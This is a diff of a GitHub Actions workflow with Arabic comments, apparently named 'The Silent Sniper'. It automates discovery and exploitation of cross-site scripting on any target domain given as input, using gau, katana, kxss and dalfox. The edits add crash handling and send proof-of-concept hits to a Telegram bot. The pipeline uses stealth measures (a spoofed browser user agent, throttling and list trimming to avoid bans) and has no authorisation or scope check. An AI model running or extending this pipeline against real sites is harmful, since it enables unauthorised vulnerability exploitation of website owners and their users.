@@ -1,4 +1,4 @@
-name: V33 - The Silent Sniper (Error Proof)
+name: V34 - The Silent Sniper (Anti-Crash)
 
 on:
   workflow_dispatch:
@@ -13,89 +13,74 @@ jobs:
     timeout-minutes: 45 
     
     steps:
-      # 1. تحديث بيئة Go لآخر إصدار لتتوافق مع Katana
+      # 1. بيئة العمل (زي ما هي شغالة تمام)
       - name: Setup Go Environment
         uses: actions/setup-go@v5
         with:
           go-version: '1.24'
 
-      # 2. تثبيت الأدوات (تم استبدال KXSS المعطوبة بنسخة شغالة)
+      # 2. تثبيت الأدوات (تمام)
       - name: Install Stealth Arsenal
         run: |
           echo "🛠️ Installing tools..."
-          
-          # أدوات جمع الروابط
           go install -v github.com/lc/gau/v2/cmd/gau@latest
           go install -v github.com/projectdiscovery/katana/cmd/katana@latest
-          
-          # أدوات الفحص (تم الإصلاح هنا)
-          # Emoe/kxss هو البديل الحديث للأداة القديمة اللي كانت بتفشل
           go install -v github.com/Emoe/kxss@latest
           go install -v github.com/hahwul/dalfox/v2@latest
-          
-          # أدوات مساعدة
           sudo apt-get update && sudo apt-get install -y jq
 
-      # 3. الاستطلاع الجراحي (مع حماية من الأخطاء)
+      # 3. الاستطلاع (زي ما هو)
       - name: 1. Surgical Recon (Parameters)
         run: |
           TARGET="${{ inputs.target }}"
           echo "🎯 Locking on target: $TARGET"
-          
-          # إنشاء الملفات فاضية عشان لو الأدوات ملقيتش حاجة السكريبت ميضربش
           touch gau_urls.txt katana_urls.txt all_params.txt
           
-          # أ. البحث في الأرشيف
           echo "⏳ Fetching archived URLs..."
-          # || true بتضمن إن لو gau فشل، السكريبت يكمل
           gau "$TARGET" --threads 2 --blacklist png,jpg,gif,css,js,woff,svg,pdf,ico | grep "=" > gau_urls.txt || true
           
-          # ب. الزحف المباشر
           echo "🕷️ Crawling live URLs..."
           katana -u "$TARGET" -c 2 -d 3 -kf all -s quiet -f qurl | grep "=" > katana_urls.txt || true
           
-          # ج. دمج وتنظيف
           cat gau_urls.txt katana_urls.txt | sort -u > all_params.txt
           
           COUNT=$(wc -l < all_params.txt)
           echo "✅ Total Parameters Found: $COUNT"
           
-          # حماية: لو القائمة كبيرة جداً نقصها عشان نتفادى البان
           if [ "$COUNT" -gt 500 ]; then
             echo "⚠️ Trimming list to top 500..."
             head -n 500 all_params.txt > temp_params.txt && mv temp_params.txt all_params.txt
           fi
 
-      # 4. فلترة الانعكاس (KXSS الجديد)
+      # 4. الفلترة
       - name: 2. Reflection Check
         run: |
           echo "✨ Checking for reflections..."
           touch targets_ready.txt kxss_out.txt
-          
           if [ -s all_params.txt ]; then
-            # تشغيل kxss
             cat all_params.txt | kxss > kxss_out.txt || true
-            # استخراج الروابط المصابة
             awk '{print $9}' kxss_out.txt > targets_ready.txt || true
-          else
-            echo "❌ No parameters found to check."
           fi
-          
           echo "🎯 Reflected Params: $(wc -l < targets_ready.txt)"
 
-      # 5. الهجوم (Dalfox)
-      - name: 3. Exploitation (Stealth Mode)
+      # 5. الهجوم (تم التعديل لمنع الانهيار) 🛡️
+      - name: 3. Exploitation (Stable Mode)
         run: |
           echo "🚀 Starting DalFox..."
-          touch dalfox_results.json
+          # بنعمل ملفين: واحد JSON وواحد Text احتياطي
+          touch dalfox_results.json dalfox_log.txt
+          
+          # أهم تعديل: --skip-mining-dom
+          # ده بيمنع فتح المتصفح التقيل اللي بيعمل Crash
           
           if [ -s targets_ready.txt ]; then
              dalfox file targets_ready.txt \
              --delay 1000 \
              --worker 2 \
              --skip-bav \
+             --skip-mining-dom \
              --user-agent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36" \
-             --format json -o dalfox_results.json || true
+             --format json -o dalfox_results.json > dalfox_log.txt 2>&1 || true
              
           elif [ -s all_params.txt ]; then
              echo "⚠️ No reflections found. Trying fallback scan..."
@@ -103,10 +88,11 @@ jobs:
              --delay 1500 \
              --worker 1 \
              --skip-bav \
-             --format json -o dalfox_results.json || true
+             --skip-mining-dom \
+             --format json -o dalfox_results.json > dalfox_log.txt 2>&1 || true
           fi
 
-      # 6. التبليغ (لن يفشل أبداً بإذن الله)
+      # 6. التبليغ (المدرع - بيشتغل حتى لو الملف بايظ) 🤖
       - name: Alert System
         if: always()
         env:
@@ -115,8 +101,9 @@ jobs:
         run: |
           TARGET="${{ inputs.target }}"
           
-          # التأكد من وجود الملف قبل القراءة
-          if [ -f dalfox_results.json ] && [ -s dalfox_results.json ]; then
+          # 1. محاولة قراءة الـ JSON (لو سليم)
+          if jq -e . dalfox_results.json >/dev/null 2>&1; then
+            # JSON سليم -> ابعت التفاصيل
             cat dalfox_results.json | jq -c '.' | while read line; do
               TYPE=$(echo $line | jq -r '.type')
               SEVERITY=$(echo $line | jq -r '.severity')
@@ -132,15 +119,31 @@ jobs:
               curl -s -X POST "https://api.telegram.org/bot$TG_TOKEN/sendMessage" -d chat_id="$TG_CHAT" -d text="$MSG" -d parse_mode="Markdown"
               sleep 2
             done
+            
+            # لو الملف سليم بس فاضي (مفيش ثغرات)
+            if [ ! -s dalfox_results.json ]; then
+                 MSG="✅ **Scan Finished (Clean).**
+                 🎯 Target: \`$TARGET\`
+                 🛡️ Status: No Vulnerabilities Found."
+                 curl -s -X POST "https://api.telegram.org/bot$TG_TOKEN/sendMessage" -d chat_id="$TG_CHAT" -d text="$MSG" -d parse_mode="Markdown"
+            fi
+            
+          # 2. لو الـ JSON بايظ (حصل Crash) -> ابعت ملف اللوج العادي
           else
-             # تقرير النظافة
-             PARAMS_COUNT=0
-             if [ -f all_params.txt ]; then PARAMS_COUNT=$(wc -l < all_params.txt); fi
-             
-             MSG="✅ **Scan Finished (Clean).**
-             🎯 Target: \`$TARGET\`
-             🔍 Params Checked: $PARAMS_COUNT
-             🛡️ Status: Secure or WAF Blocked."
-             
-             curl -s -X POST "https://api.telegram.org/bot$TG_TOKEN/sendMessage" -d chat_id="$TG_CHAT" -d text="$MSG" -d parse_mode="Markdown"
+            echo "⚠️ JSON corrupted. Sending raw log summary."
+            
+            # بندور على كلمة "Vulnerable" في اللوج النصي
+            if grep -q "\[POC\]" dalfox_log.txt; then
+                grep "\[POC\]" dalfox_log.txt | head -n 5 | while read line; do
+                    MSG="🔥 **CRASH RECOVERY HIT!**
+                    Dalfox crashed but found this before dying:
+                    \`$line\`"
+                    curl -s -X POST "https://api.telegram.org/bot$TG_TOKEN/sendMessage" -d chat_id="$TG_CHAT" -d text="$MSG" -d parse_mode="Markdown"
+                done
+            else
+                MSG="⚠️ **Scan Finished with Errors.**
+                Dalfox exited unexpectedly or found nothing.
+                Target: \`$TARGET\`"
+                curl -s -X POST "https://api.telegram.org/bot$TG_TOKEN/sendMessage" -d chat_id="$TG_CHAT" -d text="$MSG" -d parse_mode="Markdown"
+            fi
           fi
